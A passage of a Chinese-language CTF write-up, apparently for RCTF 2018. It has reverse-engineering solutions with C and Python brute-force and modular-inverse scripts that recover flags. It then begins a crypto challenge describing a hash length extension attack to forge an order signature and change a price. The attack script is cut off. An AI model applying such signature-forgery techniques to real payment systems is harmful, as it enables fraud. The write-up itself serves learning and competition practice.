63b6 ad83 f5D a60D.</span><br><span class="line">.28CCE56eaBbcF 0Bb9 ed7F 669 aff7.</span><br><span class="line">.    dC   83     4    bf a01     .</span><br><span class="line">.  DAB 2a0 CBD eB74 9eF6 0De 1Bf .</span><br><span class="line">.  E15 d55A276 7A4c fA7 eE72 dc7 .</span><br><span class="line">.  afB bE0fa2e 7Bf9 Eb14 6A5 891 .</span><br><span class="line">.  DCf c907BF9 aFBB 28eA 4dE aB1 .</span><br><span class="line">.  B25 c5B 16d d90f 0cb0 D78 Edd .</span><br><span class="line">.  aEA7   eDaD   07 743A 935 27d .</span><br><span class="line">.D38f5b1FacEaBDeFBEEcbA4 0b9D0A0f.</span><br><span class="line">.ce1A5DFCe012a0a62A5e2D8  8e38C9A.</span><br><span class="line">.CC1b26fF12fC01f8aeB7cAC06c65FCbe.</span><br><span class="line">.e663471A878EcE289bee7c11d7f8CF7b.</span><br><span class="line">.--------------------------------.</span><br><span class="line">    @ck_For_fun_02508iO2_2iOR&#125;</span><br><span class="line">.--------------------------------.</span><br></pre></td></tr></table></figure><p>flag: <strong>rctf{h@ck_For_fun_02508iO2_2iOR}</strong></p><h3><span id="sql"><strong>sql</strong></span></h3><p><strong>指令集</strong><a href="https://www.sqlite.org/opcode.html" class="uri" target="_blank" rel="noopener">https://www.sqlite.org/opcode.html</a></p><p><strong>类似与汇编代码。先初始化寄存器存的值，然后取值进行比较。</strong></p><p><strong>每行数值依次含义为</strong></p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/1df2bfd3e7e211338aa6b82052456b38.png?raw=true"></p><p><strong>（用excel导入一下数据看起来比较清晰）</strong></p><p><strong>主要指令流程如下：</strong></p><p>goto 93</p><p>初始化一系列Interger和String到内存中</p><p>goto 2</p><p>OpenRead</p><p>Rewind # if the table or index is empty, jump to 91 (close)</p><p>循环Column（取值）、Function（调用substr(X,Y,Z)函数）、Ne（比较），简化如下：</p><p># The substr(X,Y,Z) function returns a substring of input string X that begins with the Y-th character and which is Z characters long.</p><p>r2,1,1,f</p><p>r6,3,1,a</p><p>r10,25,1,r</p><p>r14,14,1,g</p><p>r18,9,1,_</p><p>r22,12,1,f</p><p>r25,21,1,r</p><p>r28,18,1,_</p><p>r31,28,1,}</p><p>r35,15,1,a</p><p>r38,2,1,l</p><p>r42,13,1,_</p><p>r45,16,1,l</p><p>r48,27,1,a</p><p>r51,7,1,q</p><p>r55,10,1,r</p><p>r58,22,1,e</p><p>r62,4,1,g</p><p>r65,24,1,e</p><p>r68,20,1,s</p><p>r72,11,1,o</p><p>r76,8,1,s</p><p>r79,19,1,s</p><p>r82,6,1,l</p><p>r85,26,1,_</p><p>r88,23,1,v</p><p>r92,5,1,{</p><p>r96,17,1,f</p><p>（前三列为substr的三个参数，最后一列为用作比较的字符）</p><p>调整一下顺序可得flag</p><p>flag: <strong>flag{lqs_rof_galf_esrever_a}</strong></p><h3><span id="compiler">compiler</span></h3><p>第一部分compiler, gcc编译helloworld.c, 在程序中发现字符串:</p><blockquote><p>RCTF_HINT1: Compiler flag part 1 is here, but where is part 2?</p><p>You can think about this question: Why does this function exists in this binary?</p><p>RCTF_HINT2: part 2 is not in gcc, dont waste you time.</p></blockquote><p>断libc_start_main在栈中找到part1:"RCTF{Without".</p><p>第二部分bash, 先12次flag, 再2次prince(executable name为bash)跳过公主死亡的剧情, 继续flag得到hint:</p><blockquote><p>The flag is (part1, plain(hash1), plain(hash2), plain(hash3), '}').join('') The hashes of remaining flag is: 13340610174042144018, 95741437967718225, 484886919005526 I know the queen hijacked me by a function which used this hash algorithm!</p></blockquote><p>hijack用的是add_alias函数, hash算法在hash_insert中:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v4 = *<span class="built_in">string</span>;</span><br><span class="line">v5 = <span class="built_in">string</span>;</span><br><span class="line"><span class="keyword">for</span> ( hash = <span class="number">0L</span>L; v4; v4 = *v5 )</span><br><span class="line">&#123;</span><br><span class="line">  ++v5;</span><br><span class="line">  hash = v4 ^ <span class="number">0x8B</span> * hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>穷举明文:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">uint64_t</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint64_t</span> base, v, ch;</span><br><span class="line"><span class="keyword">int</span> j;</span><br><span class="line"><span class="keyword">if</span> (val == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = i - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, buf[j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">base = val / <span class="number">0x8B</span>;</span><br><span class="line"></span><br><span class="line">v = (base) * <span class="number">0x8B</span>;</span><br><span class="line">ch = v ^ val;</span><br><span class="line"><span class="keyword">if</span> (ch &gt;= <span class="number">0x20</span> &amp;&amp; ch &lt; <span class="number">0x7F</span>)</span><br><span class="line">&#123;</span><br><span class="line">buf[i] = ch;</span><br><span class="line">foo(i + <span class="number">1</span>, base);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v = (base + <span class="number">1</span>) * <span class="number">0x8B</span>;</span><br><span class="line">ch = v ^ val;</span><br><span class="line"><span class="keyword">if</span> (ch &gt;= <span class="number">0x20</span> &amp;&amp; ch &lt; <span class="number">0x7F</span>)</span><br><span class="line">&#123;</span><br><span class="line">buf[i] = ch;</span><br><span class="line">foo(i + <span class="number">1</span>, base + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">foo(<span class="number">0</span>, <span class="number">13340610174042144018</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"done\n"</span>);</span><br><span class="line">foo(<span class="number">0</span>, <span class="number">95741437967718225</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"done\n"</span>);</span><br><span class="line">foo(<span class="number">0</span>, <span class="number">484886919005526</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"done\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>_no_seAms _NoR_nEe Dlework</p></blockquote><p>flag: <strong>RCTF{Without_no_seAms_NoR_nEeDlework}</strong></p><h3><span id="simple-re">simple re</span></h3><p>校验函数sub_401482.</p><p>穷举第一段24个字符:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> aa[<span class="number">6</span>], bb[<span class="number">6</span>], cc[<span class="number">6</span>], j;</span><br><span class="line"><span class="keyword">uint64_t</span> n, m;</span><br><span class="line"><span class="keyword">char</span> *p;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">bb[<span class="number">0</span>] = <span class="number">0x556E4969</span>;</span><br><span class="line">bb[<span class="number">1</span>] = <span class="number">0x2E775361</span>;</span><br><span class="line">bb[<span class="number">2</span>] = <span class="number">0x893DAE7</span>;</span><br><span class="line">bb[<span class="number">3</span>] = <span class="number">0x96990423</span>;</span><br><span class="line">bb[<span class="number">4</span>] = <span class="number">0x6CF9D3E9</span>;</span><br><span class="line">bb[<span class="number">5</span>] = <span class="number">0xA505531F</span>;</span><br><span class="line">aa[<span class="number">0</span>] = <span class="number">0x54A0B9BD</span>;</span><br><span class="line">aa[<span class="number">1</span>] = <span class="number">0x4B818640</span>;</span><br><span class="line">aa[<span class="number">2</span>] = <span class="number">0x8EB63387</span>;</span><br><span class="line">aa[<span class="number">3</span>] = <span class="number">0xA9EABEFD</span>;</span><br><span class="line">aa[<span class="number">4</span>] = <span class="number">0xB8CDF96B</span>;</span><br><span class="line">aa[<span class="number">5</span>] = <span class="number">0x113C3052</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j != <span class="number">0xFFFFFFFF</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">n = j * <span class="number">0x100000000</span>;</span><br><span class="line">n += aa[i];</span><br><span class="line"><span class="keyword">if</span> (n % bb[i] == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">cc[i] = n / bb[i];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"cc[%d] == %08X\n"</span>, i, cc[i]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">p = (<span class="keyword">char</span>*)cc;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, p[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>cc[0] == 4D5F6F35 cc[1] == 5F796E40 cc[2] == 69376E61 cc[3] == 7665525F cc[4] == 69737233 cc[5] == 545F676E 5o_M@ny_an7i_Rev3rsing_T</p></blockquote><p>穷举第二段8个字符:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> foo1(<span class="keyword">uint16_t</span> a1, <span class="keyword">uint16_t</span> a2)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">uint16_t</span> v2; <span class="comment">// ST16_2</span></span><br><span class="line"><span class="keyword">uint16_t</span> i; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line"><span class="keyword">uint16_t</span> v5; <span class="comment">// [rsp+4h] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">v5 = a1;</span><br><span class="line"><span class="keyword">for</span> (i = a2; i &amp; v5; i = <span class="number">2</span> * (i &amp; v2))</span><br><span class="line">&#123;</span><br><span class="line">v2 = v5;</span><br><span class="line">v5 ^= i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> i | v5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> foo2(<span class="keyword">uint32_t</span> x, <span class="keyword">uint32_t</span> y, <span class="keyword">uint32_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> yy; <span class="comment">// [rsp+4h] [rbp-18h]</span></span><br><span class="line"><span class="keyword">uint64_t</span> v5; <span class="comment">// [rsp+Ch] [rbp-10h]</span></span><br><span class="line"><span class="keyword">uint64_t</span> v6; <span class="comment">// [rsp+14h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">yy = y;</span><br><span class="line">v6 = <span class="number">1L</span>L;</span><br><span class="line">v5 = x;</span><br><span class="line"><span class="keyword">while</span> (yy)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (yy &amp; <span class="number">1</span>)</span><br><span class="line">v6 = v5 * v6 % n;</span><br><span class="line">v5 = v5 * v5 % n;</span><br><span class="line">yy &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">int</span> i1, i2, i3, i4, i5, i6, i7, i8, i, j, v;</span><br><span class="line"><span class="keyword">uint32_t</span> *p1;</span><br><span class="line"><span class="keyword">uint16_t</span> *p2, *p3;</span><br><span class="line">p1 = (<span class="keyword">uint32_t</span> *)(buf + <span class="number">0</span>);</span><br><span class="line">p2 = (<span class="keyword">uint16_t</span> *)(buf + <span class="number">4</span>);</span><br><span class="line">p3 = (<span class="keyword">uint16_t</span> *)(buf + <span class="number">6</span>);</span><br><span class="line"><span class="keyword">for</span> (i1 = <span class="number">0x20</span>; i1 &lt; <span class="number">0x7F</span>; i1++)</span><br><span class="line">&#123;</span><br><span class="line">buf[<span class="number">4</span>] = i1;</span><br><span class="line"><span class="keyword">for</span> (i2 = <span class="number">0x20</span>; i2 &lt; <span class="number">0x7F</span>; i2++)</span><br><span class="line">&#123;</span><br><span class="line">buf[<span class="number">5</span>] = i2;</span><br><span class="line"><span class="keyword">for</span> (i3 = <span class="number">0x20</span>; i3 &lt; <span class="number">0x7F</span>; i3++)</span><br><span class="line">&#123;</span><br><span class="line">buf[<span class="number">6</span>] = i3;</span><br><span class="line"><span class="keyword">for</span> (i4 = <span class="number">0x20</span>; i4 &lt; <span class="number">0x7F</span>; i4++)</span><br><span class="line">&#123;</span><br><span class="line">buf[<span class="number">7</span>] = i4;</span><br><span class="line"><span class="keyword">if</span> (foo1(*p2, *p3) == <span class="number">0xA496</span>) <span class="comment">// -----</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (i5 = <span class="number">0x20</span>; i5 &lt; <span class="number">0x7F</span>; i5++)</span><br><span class="line">&#123;</span><br><span class="line">buf[<span class="number">0</span>] = i5;</span><br><span class="line"><span class="keyword">for</span> (i6 = <span class="number">0x20</span>; i6&lt; <span class="number">0x7F</span>; i6++)</span><br><span class="line">&#123;</span><br><span class="line">buf[<span class="number">1</span>] = i6;</span><br><span class="line"><span class="keyword">for</span> (i7 = <span class="number">0x20</span>; i7 &lt; <span class="number">0x7F</span>; i7++)</span><br><span class="line">&#123;</span><br><span class="line">buf[<span class="number">2</span>] = i7;</span><br><span class="line"><span class="comment">// -------- i8</span></span><br><span class="line">buf[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">v = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">v ^= buf[i];</span><br><span class="line">&#125;</span><br><span class="line">i8 = <span class="number">22</span> ^ v;</span><br><span class="line"><span class="keyword">if</span> (i8 &lt; <span class="number">0x7F</span> &amp;&amp; i8 &gt; <span class="number">0x20</span>)</span><br><span class="line">&#123;</span><br><span class="line">buf[<span class="number">3</span>] = i8;</span><br><span class="line"><span class="keyword">if</span> (foo2(*p1, *p2, <span class="number">0xF64BB17D</span>) == <span class="number">0x6F82C8DC</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, buf[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>echn!qu3</p></blockquote><p>第33个字符's'</p><p>flag: <strong>RCTF{5o_M@ny_an7i_Rev3rsing_Techn!qu3s}</strong></p><h3><span id="babyre2"><strong>babyre2</strong></span></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> data[<span class="number">8</span>] =</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="number">0x2B7192452905E8FB</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x7BA58F82BD898035</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xA3112746582E1434</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x163F756FCC221AB0</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xECC78E6FB9CBA1FE</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xDCDD8B49EA5D7E14</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xA2845FE0B3096F8E</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xAAAAAAAAAA975D1C</span>,</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> mull[<span class="number">8</span>] =</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="number">0x20656D6F636C6557</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x2046544352206F74</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x6548202138313032</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x2061207369206572</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x6320455279626142</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x65676E656C6C6168</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x756F7920726F6620</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xFFFFFFFFFFFF002E</span>,</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> modd = <span class="number">0xFFFFFFFFFFFFFFC5</span>;</span><br><span class="line"></span><br><span class="line">(input[i] * mull[i]) % modd = data[i]</span><br></pre></td></tr></table></figure><p>(A * mull) % modd = data 化成 A % modd = data*mull^(-1)</p><p>再A=data*mull^(-1) modd，然后上脚本 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span>     <span class="title">gcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> a!=<span class="number">0</span>:</span><br><span class="line">            a,b = b%a,a</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line"><span class="comment">#定义一个函数，参数分别为a,n，返回值为b</span></span><br><span class="line"><span class="function"><span class="keyword">def</span>     <span class="title">findModReverse</span><span class="params">(a,m)</span>:</span><span class="comment">#这个扩展欧几里得算法求模逆</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> gcd(a,m)!=<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">        u1,u2,u3 = <span class="number">1</span>,<span class="number">0</span>,a</span><br><span class="line">        v1,v2,v3 = <span class="number">0</span>,<span class="number">1</span>,m</span><br><span class="line">        <span class="keyword">while</span> v3!=<span class="number">0</span>:</span><br><span class="line">            q = u3//v3</span><br><span class="line">            v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3</span><br><span class="line">        <span class="keyword">return</span> u1%m</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> findModReverse(<span class="number">3</span>,<span class="number">11</span>)</span><br><span class="line">d = <span class="number">0xFFFFFFFFFFFFFFC5</span></span><br><span class="line">a = [<span class="number">0x20656D6F636C6557</span>,<span class="number">0x2046544352206F74</span>,<span class="number">0x6548202138313032</span>,<span class="number">0x2061207369206572</span>,<span class="number">0x6320455279626142</span>,<span class="number">0x65676E656C6C6168</span>,<span class="number">0x756F7920726F6620</span>,<span class="number">0xFFFFFFFFFFFF002E</span>]</span><br><span class="line">a_re = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">num = findModReverse(i,d)</span><br><span class="line"><span class="comment">#print hex(num)</span></span><br><span class="line">a_re.append(num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = [<span class="number">0x2B7192452905E8FB</span>,<span class="number">0x7BA58F82BD898035</span>,<span class="number">0xA3112746582E1434</span>,<span class="number">0x163F756FCC221AB0</span>,<span class="number">0xECC78E6FB9CBA1FE</span>,<span class="number">0xDCDD8B49EA5D7E14</span>,<span class="number">0xA2845FE0B3096F8E</span>,<span class="number">0xAAAAAAAAAA975D1C</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#for j in range(len(a)):</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(len(a)):</span><br><span class="line"><span class="comment">#print k</span></span><br><span class="line">num = (a_re[k] * data[k]) % d</span><br><span class="line"><span class="keyword">print</span> hex(num),hex(num)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">flag += hex(num)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure></p><h2><span id="0x04-crypto">0x04 Crypto</span></h2><h3><span id="cpushop"><strong>cpushop</strong></span></h3><p>nc连接是个cpu商店，flag很贵买不起，支付时验证了order，order的sign由一个随机signkey和订单信息生成，可能存在哈希长度拓展攻击，通过修改价格买下flag</p><p>(打扰了，signkey的长度为random.randint(8,32))</p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/25dd65951d9e883f7c89bd46ec5e4c7f.png?raw=true"></p><p>通过哈希长度拓展攻击来修改订单价格</p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/35d7256716e8eff78af2ffd41f79379a.png?raw=true"> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 